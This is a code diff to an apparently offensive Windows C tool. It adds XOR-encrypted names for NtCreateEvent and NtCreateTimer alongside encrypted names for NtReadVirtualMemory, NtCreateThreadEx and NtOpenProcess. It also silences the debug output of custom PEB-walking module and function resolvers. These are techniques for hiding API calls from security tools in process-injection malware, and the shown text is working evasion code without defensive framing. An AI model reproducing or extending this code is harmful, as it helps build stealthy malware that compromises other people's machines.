@@ -17,6 +17,8 @@ UCHAR __NtQueryInformationProcess[] = { 0x3c, 0x0e, 0x35, 0x1d, 0x0a, 0x02, 0x26
 UCHAR _NtReadVirtualMemory[] = { 0x3c, 0x0e, 0x36, 0x0d, 0x0e, 0x14, 0x09, 0x00, 0x01, 0x2b, 0x14, 0x3e, 0x02, 0x24, 0x06, 0x08, 0x30, 0x15, 0x0c, 0x79 };
 UCHAR _NtCreateThreadEx[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x26, 0x1d, 0x5f };
 UCHAR _NtOpenProcess[] = { 0x3c, 0x0e, 0x2b, 0x18, 0x0a, 0x1e, 0x0f, 0x1b, 0x1c, 0x3c, 0x04, 0x2c, 0x1d, 0x69 };
+UCHAR _NtCreateEvent[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x36, 0x29, 0x04, 0x31, 0x1a, 0x69 };
+UCHAR _NtCreateTimer[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x36, 0x0c, 0x3a, 0x1c, 0x69 };
 UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
 
 VOID SetupConstants(){
@@ -30,6 +32,8 @@ VOID SetupConstants(){
     XOR(_NtReadVirtualMemory, sizeof(_NtReadVirtualMemory), key, sizeof(key));
     XOR(_NtCreateThreadEx, sizeof(_NtCreateThreadEx), key, sizeof(key));
     XOR(_NtOpenProcess, sizeof(_NtOpenProcess), key, sizeof(key));
+    XOR(_NtCreateEvent, sizeof(_NtCreateEvent), key, sizeof(key));
+    XOR(_NtCreateTimer, sizeof(_NtCreateTimer), key, sizeof(key));
 }
 
 void hexdump(char *data, size_t size) {
@@ -154,26 +158,26 @@ HMODULE CustomGetModuleHandleW(LPCWSTR moduleName){
     size_t moduleName_sz = lstrlenW(moduleName);   
 
     //TEB (GS:0x30) + offset PEB (0x30)
-    printf("[*] Getting PEB via GS+offset(0x60)\n");
+    //printf("[*] Getting PEB via GS+offset(0x60)\n");
     PPEB pPeb = (PPEB)__readgsqword(0x60); // PPEB ProcessEnvironmentBlock;
 
-    printf("[*] Getting PEB_LDR_DATA via PEB\n");
+    //printf("[*] Getting PEB_LDR_DATA via PEB\n");
     PPEB_LDR_DATA Ldr = pPeb->Ldr;//PPEB_LDR_DATA LoaderData
 
     PLIST_ENTRY _InMemoryOrderModuleList = &Ldr->InMemoryOrderModuleList;
-    printf("[*] Getting lists of _LDR_DATA_TABLE_ENTRY via LoaderData::InMemoryOrderModuleList\n");
-    printf("[*] Iterating InMemoryOrderModuleList\n");
+    //printf("[*] Getting lists of _LDR_DATA_TABLE_ENTRY via LoaderData::InMemoryOrderModuleList\n");
+    //printf("[*] Iterating InMemoryOrderModuleList\n");
     int DoneFlag = 0;
     for (PLIST_ENTRY currElem = _InMemoryOrderModuleList->Flink; (currElem != _InMemoryOrderModuleList) && !DoneFlag; currElem = currElem->Flink){
         PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)currElem - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
         LPCWSTR BaseName = wcsrchr(entry->FullDllName.Buffer, L'\\')+1;
 
         if (!_wcsnicmp(moduleName, BaseName, moduleName_sz)) { //Case insensitive
-            printf("[*] Found Module '%ls' !\n", moduleName);
-            printf("[*] %ls DllBase (HMODULE) : 0x%p \n", BaseName, entry->DllBase);
+            //printf("[*] Found Module '%ls' !\n", moduleName);
+            //printf("[*] %ls DllBase (HMODULE) : 0x%p \n", BaseName, entry->DllBase);
             hModule = (HMODULE)entry->DllBase;
             DoneFlag = 1;
-        } else printf("[Debug] Skiping '%ls' ('%ls')\n", BaseName, entry->FullDllName.Buffer);
+        } //else printf("[Debug] Skiping '%ls' ('%ls')\n", BaseName, entry->FullDllName.Buffer);
     } 
 
     return hModule;
@@ -185,14 +189,14 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     //Cast DOS header
     PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
     if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
-        printf("[-] Erreur de recuperation du DOS Header\n");
+        //printf("[-] Erreur de recuperation du DOS Header\n");
 		return NULL;
     }
 
     //Get NTHeader ptr from DOS header
     PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
 	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-		printf("[-] Erreur de recuperation du NtHeader\n");
+		//printf("[-] Erreur de recuperation du NtHeader\n");
         return NULL;
     }
 
